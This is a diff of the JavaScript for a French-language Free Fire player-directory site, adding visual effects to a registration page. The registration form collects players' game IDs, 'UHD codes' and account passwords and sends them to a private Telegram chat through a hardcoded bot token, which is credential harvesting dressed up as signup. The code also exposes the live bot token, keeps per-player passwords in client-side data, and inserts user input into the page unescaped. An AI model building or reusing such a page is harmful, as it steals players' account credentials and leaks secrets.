@@ -1,445 +1,90 @@
-// LOADER
-window.onload = () => {
+// K227 AURA SYSTEM V2
+window.addEventListener("load",()=>{
+  const loader=document.getElementById("loader"), bar=document.getElementById("progressBar"), pct=document.getElementById("loaderPercent"), status=document.getElementById("loaderStatus"), lines=document.getElementById("bootLines");
+  const boot=["CONNECTING TO AURA NETWORK","LOADING FREE FIRE DATABASE","MATRIX CORE ONLINE","PLAYER SYSTEM READY","SECURITY CHECK COMPLETE","ACCESS GRANTED"];
+  let p=0,i=0;
+  const timer=setInterval(()=>{
+    p+=Math.floor(Math.random()*8)+4;if(p>100)p=100;
+    bar.style.width=p+"%";pct.textContent=p+"%";
+    if(p>15&&p<35)status.textContent="CONNECTING TO AURA NETWORK...";
+    else if(p<55)status.textContent="LOADING FREE FIRE DATABASE...";
+    else if(p<75)status.textContent="INITIALIZING MATRIX CORE...";
+    else if(p<92)status.textContent="VERIFYING PLAYER SYSTEM...";
+    else status.textContent="ACCESS GRANTED // WELCOME K227";
+    if(i<boot.length&&p>i*16){const d=document.createElement("div");d.textContent=boot[i++];lines.appendChild(d)}
+    if(p>=100){clearInterval(timer);setTimeout(()=>{loader.style.opacity="0";loader.style.transition="opacity .6s";setTimeout(()=>loader.remove(),650)},550)}
+  },120);
+});
 
-  setTimeout(() => {
+const canvas=document.getElementById("matrix"),ctx=canvas.getContext("2d");
+let fontSize=14,drops=[];
+function resizeMatrix(){canvas.width=innerWidth;canvas.height=innerHeight;drops=Array(Math.ceil(canvas.width/fontSize)).fill(1)}
+resizeMatrix();addEventListener("resize",resizeMatrix);
+const chars="01 AURA K227 FF HACKER 227";
+function matrix(){ctx.fillStyle="rgba(0,0,0,.035)";ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle="#55ddff";ctx.font=fontSize+"px monospace";for(let x=0;x<drops.length;x++){const t=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(t,x*fontSize,drops[x]*fontSize);if(drops[x]*fontSize>canvas.height&&Math.random()>.975)drops[x]=0;drops[x]++}}setInterval(matrix,38);
 
-    document.getElementById("loader")
-      .style.display = "none";
+function clock(){document.getElementById("clock").textContent=new Date().toLocaleTimeString("fr-FR")}clock();setInterval(clock,1000);
 
-  }, 2500);
+const terminal=document.getElementById("terminalText");
+const terminalLines=["> boot --aura-core","[OK] matrix engine initialized","[OK] player database loaded","[OK] security module online","[INFO] aura status: MAX","[READY] waiting for player access..."];
+let ti=0,li=0;
+function typeTerminal(){if(li>=terminalLines.length)return;let s=terminalLines[li],c=0;const row=document.createElement("div");terminal.appendChild(row);const t=setInterval(()=>{row.textContent=s.slice(0,++c);if(c>=s.length){clearInterval(t);li++;setTimeout(typeTerminal,180)}},22)}setTimeout(typeTerminal,1000);
 
-};
-
-
-// MATRIX EFFECT
-const canvas =
-  document.getElementById("matrix");
-
-const ctx =
-  canvas.getContext("2d");
-
-canvas.width =
-  window.innerWidth;
-
-canvas.height =
-  window.innerHeight;
-
-const letters =
-  "01FFHACKERAURA";
-
-const fontSize = 14;
-
-const columns =
-  canvas.width / fontSize;
-
-const drops = [];
-
-for(let i = 0; i < columns; i++){
-
-  drops[i] = 1;
-
-}
-
-function drawMatrix(){
-
-  ctx.fillStyle =
-    "rgba(0,0,0,0.05)";
-
-  ctx.fillRect(
-    0,
-    0,
-    canvas.width,
-    canvas.height
-  );
-
-  ctx.fillStyle = "#ff003c";
-
-  ctx.font =
-    fontSize + "px monospace";
-
-  for(let i = 0; i < drops.length; i++){
-
-    const text =
-      letters.charAt(
-        Math.floor(
-          Math.random() * letters.length
-        )
-      );
-
-    ctx.fillText(
-      text,
-      i * fontSize,
-      drops[i] * fontSize
-    );
-
-    if(
-      drops[i] * fontSize >
-      canvas.height &&
-      Math.random() > 0.975
-    ){
-
-      drops[i] = 0;
-
-    }
-
-    drops[i]++;
-
+function socialButton(value,icon,label,type){
+  if(!value || value.toLowerCase()==="privé") return `<span class="social-btn private"><span class="social-icon">${icon}</span>${label} // PRIVATE</span>`;
+  let href=value;
+  if(type==="whatsapp"){
+    const digits=value.replace(/\D/g,"");
+    href=digits?`https://wa.me/${digits}`:"#";
+  } else if(!/^https?:\/\//i.test(value)){
+    href="#";
   }
-
+  const extra=href==="#"?' onclick="toast(\'Lien non disponible\');return false;"': ' target="_blank" rel="noopener"';
+  return `<a class="social-btn ${type}" href="${href}"${extra}><span class="social-icon">${icon}</span>${label} // ACCESS</a>`;
 }
 
-setInterval(drawMatrix, 35);
-
-
-// RESPONSIVE MATRIX
-window.addEventListener(
-  "resize",
-  () => {
-
-    canvas.width =
-      window.innerWidth;
-
-    canvas.height =
-      window.innerHeight;
-
-  }
-);
-
-
-// PLAYERS
-const playersContainer =
-  document.getElementById("playersContainer");
-
-function displayPlayers(){
-
-  playersContainer.innerHTML = "";
-
-  players.forEach((player, index) => {
-
-    const card =
-      document.createElement("div");
-
-    card.classList.add("player-card");
-
-    card.innerHTML = `
-
-      <img src="${player.image}"
-           alt="${player.name}">
-
-      <div class="player-info">
-
-        <h3>${player.name}</h3>
-
-        <p>🎮 UHD ID : ${player.uid}</p>
-
-        <p>⭐ Niveau : ${player.level}</p>
-
-        <p>🏆 Rang : ${player.rank}</p>
-
-        <p>📱 TikTok : ${player.tiktok}</p>
-
-        <p>📞 WhatsApp : ${player.whatsapp}</p>
-
-        <p class="description">
-          ${player.description || "FREE FIRE PLAYER MERCI DE M'AJOUTER EN AMI 😎✅"}
-        </p>
-
-        <p class="aura-badge">
-          ⚡ AURA MAX ⚡
-        </p>
-
-        <input type="password"
-               placeholder="Mot de passe"
-               class="code-input"
-               id="pass-${index}">
-
-        <button onclick="showCode(${index})">
-
-          Voir UHD Code
-
-        </button>
-
-        <div id="result-${index}"
-             class="hidden-code"></div>
-
-      </div>
-
-    `;
-
-    playersContainer.appendChild(card);
-
-  });
-
+const playersContainer=document.getElementById("playersContainer"),count=document.getElementById("playerCount");
+count.textContent=players.length;
+function displayPlayers(list=players){
+ playersContainer.innerHTML="";
+ list.forEach((p,index)=>{
+  const card=document.createElement("div");card.className="player-card";
+  card.innerHTML=`<div class="photo-wrap"><span class="online">ONLINE</span><img src="${p.image}" alt="${p.name}"></div>
+  <div class="player-info"><h3>${p.name}</h3>
+  <p>🎮 <b>UHD ID :</b> ${p.uid}</p><p>⭐ <b>Niveau :</b> ${p.level}</p><p>🏆 <b>Rang :</b> ${p.rank}</p>
+  <div class="social-buttons">
+  ${socialButton(p.tiktok,"🎵","TIKTOK","tiktok")}
+  ${socialButton(p.whatsapp,"📞","WHATSAPP","whatsapp")}
+</div>
+  <p class="description">${p.description||"FREE FIRE PLAYER MERCI DE M'AJOUTER EN AMI 😎✅"}</p>
+  <p class="aura-badge">⚡ AURA MAX // VERIFIED ⚡</p>
+  <input type="password" placeholder="🔐 Mot de passe d'accès" class="code-input" id="pass-${index}">
+  <button onclick="showCode(${index})">🔓 AUTHENTICATE // UHD</button><div id="result-${index}" class="hidden-code"></div></div>`;
+  playersContainer.appendChild(card);setTimeout(()=>card.classList.add("show"),index*90);
+ });
 }
-
 displayPlayers();
 
+function toast(msg){const t=document.getElementById("toast");t.textContent=msg;t.classList.add("show");setTimeout(()=>t.classList.remove("show"),2200)}
+function showCode(index){const input=document.getElementById(`pass-${index}`),result=document.getElementById(`result-${index}`);if(input.value===players[index].password){result.innerHTML=`<p>✓ ACCESS GRANTED</p><p>⚡ UHD CODE : ${players[index].code}</p><button onclick="copyCode('${players[index].code}')">📋 COPIER UHD CODE</button>`;toast("✓ ACCESS GRANTED // UHD CODE UNLOCKED")}else{result.innerHTML="❌ ACCESS DENIED // MOT DE PASSE INCORRECT";toast("✕ ACCESS DENIED")}}
+function copyCode(code){navigator.clipboard.writeText(code).then(()=>toast("✓ UHD CODE COPIÉ 😎")).catch(()=>toast("Copie non disponible"))}
 
-// SHOW UHD CODE
-function showCode(index){
+document.getElementById("search").addEventListener("input",function(){const v=this.value.toLowerCase();document.querySelectorAll(".player-card").forEach(c=>c.style.display=c.innerText.toLowerCase().includes(v)?"block":"none")});
 
-  const input =
-    document.getElementById(
-      `pass-${index}`
-    );
+const photoInput=document.getElementById("photo"),preview=document.getElementById("preview"),upload=document.querySelector(".upload-box");
+photoInput.addEventListener("change",function(){const f=this.files[0];if(f){preview.src=URL.createObjectURL(f);preview.style.display="block";upload.classList.add("scanned");upload.textContent="✓ PHOTO READY // AURA SCAN COMPLETE";toast("✓ PHOTO VERIFIED")}});
 
-  const result =
-    document.getElementById(
-      `result-${index}`
-    );
-
-  if(
-    input.value ===
-    players[index].password
-  ){
-
-    result.innerHTML = `
-
-      <p>
-        ✅ UHD CODE :
-        ${players[index].code}
-      </p>
-
-      <button onclick="copyCode('${players[index].code}')">
-
-        📋 Copier UHD Code
-
-      </button>
-
-    `;
-
-  } else {
-
-    result.innerHTML =
-      "❌ Mot de passe incorrect";
-
-  }
-
-}
-
-
-// COPY UHD CODE
-function copyCode(code){
-
-  navigator.clipboard
-  .writeText(code)
-
-  .then(() => {
-
-    alert(
-      "✅ UHD CODE copié 😎"
-    );
-
-  });
-
-}
-
-
-// SEARCH PLAYER
-document
-.getElementById("search")
-.addEventListener(
-  "keyup",
-  function(){
-
-    const value =
-      this.value.toLowerCase();
-
-    const cards =
-      document.querySelectorAll(".player-card");
-
-    cards.forEach(card => {
-
-      const text =
-        card.innerText.toLowerCase();
-
-      if(text.includes(value)){
-
-        card.style.display =
-          "block";
-
-      } else {
-
-        card.style.display =
-          "none";
-
-      }
-
-    });
-
+const form=document.getElementById("registerForm"),message=document.getElementById("message");
+form.addEventListener("submit",function(e){
+ e.preventDefault();
+ const name=document.getElementById("name").value,uid=document.getElementById("uid").value,level=document.getElementById("level").value,rank=document.getElementById("rank").value,code=document.getElementById("code").value,password=document.getElementById("password").value,tiktok=document.getElementById("tiktok").value,whatsapp=document.getElementById("whatsapp").value,photo=photoInput.files[0];
+ if(!photo){message.textContent="❌ Choisis une photo avant d'envoyer";return}
+ // TELEGRAM — conserve le système original demandé
+ const token="8369361718:AAG2hwt6CzwBfWJsvqkS8NO1-8BfbfhMQs0";
+ const chatId="7239404667";
+ const text=`\n🔥 Nouveau Joueur FF 🔥\n\n👤 Nom : ${name}\n\n🎮 UHD ID : ${uid}\n\n⭐ Niveau : ${level}\n\n🏆 Rang : ${rank}\n\n🔐 UHD CODE : ${code}\n\n🛡️ Password : ${password}\n\n📱 TikTok : ${tiktok}\n\n📞 WhatsApp : ${whatsapp}\n`;
+ const fd=new FormData();fd.append("chat_id",chatId);fd.append("caption",text);fd.append("photo",photo);
+ fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:fd}).then(()=>{
+  message.textContent="🔥 Reviens dans 24h ou moins 🙂\n\nkawaki227 va enregistrer votre compte sur le site.\n\nMerci de patienter 😎";form.reset();preview.style.display="none";upload.classList.remove("scanned");upload.textContent="📸 CHOISIR UNE PHOTO POUR TON PROFIL";toast("✓ REGISTRATION SENT");
+ }).catch(()=>{message.textContent="❌ Erreur d'envoi";toast("✕ ERREUR D'ENVOI")});
 });
-
-
-// FORM
-const form =
-  document.getElementById("registerForm");
-
-const message =
-  document.getElementById("message");
-
-form.addEventListener(
-  "submit",
-  function(e){
-
-    e.preventDefault();
-
-    const name =
-      document.getElementById("name").value;
-
-    const uid =
-      document.getElementById("uid").value;
-
-    const level =
-      document.getElementById("level").value;
-
-    const rank =
-      document.getElementById("rank").value;
-
-    const code =
-      document.getElementById("code").value;
-
-    const password =
-      document.getElementById("password").value;
-
-    const tiktok =
-      document.getElementById("tiktok").value;
-
-    const whatsapp =
-      document.getElementById("whatsapp").value;
-
-    const photo =
-      document.getElementById("photo").files[0];
-
-
-    // PHOTO OBLIGATOIRE
-    if(!photo){
-
-      message.innerHTML =
-        "❌ Choisis une photo avant d'envoyer";
-
-      return;
-
-    }
-
-
-    // TELEGRAM
-    const token =
-      "8369361718:AAG2hwt6CzwBfWJsvqkS8NO1-8BfbfhMQs0";
-
-    const chatId =
-      "7239404667";
-
-
-    const text = `
-
-🔥 Nouveau Joueur FF 🔥
-
-👤 Nom : ${name}
-
-🎮 UHD ID : ${uid}
-
-⭐ Niveau : ${level}
-
-🏆 Rang : ${rank}
-
-🔐 UHD CODE : ${code}
-
-🛡️ Password : ${password}
-
-📱 TikTok : ${tiktok}
-
-📞 WhatsApp : ${whatsapp}
-
-    `;
-
-
-    const formData =
-      new FormData();
-
-    formData.append(
-      "chat_id",
-      chatId
-    );
-
-    formData.append(
-      "caption",
-      text
-    );
-
-    formData.append(
-      "photo",
-      photo
-    );
-
-
-    fetch(
-      `https://api.telegram.org/bot${token}/sendPhoto`,
-      {
-        method:"POST",
-        body:formData
-      }
-    )
-
-    .then(() => {
-
-      message.innerHTML = `
-
-🔥 Reviens dans 24h ou moins 🙂
-
-kawaki227 va enregistrer votre compte sur le site.
-
-Merci de patienter 😎
-
-      `;
-
-      form.reset();
-
-      preview.style.display =
-        "none";
-
-    })
-
-    .catch(() => {
-
-      message.innerHTML =
-        "❌ Erreur d'envoi";
-
-    });
-
-});
-
-
-// PHOTO PREVIEW
-const photoInput =
-  document.getElementById("photo");
-
-const preview =
-  document.getElementById("preview");
-
-photoInput.addEventListener(
-  "change",
-  function(){
-
-    const file =
-      this.files[0];
-
-    if(file){
-
-      preview.style.display =
-        "block";
-
-      preview.src =
-        URL.createObjectURL(file);
-
-    }
-
-});
-
-
-// CLICK UPLOAD BOX
-function choosePhoto(){
-
-  document.getElementById("photo")
-    .click();
-
-}
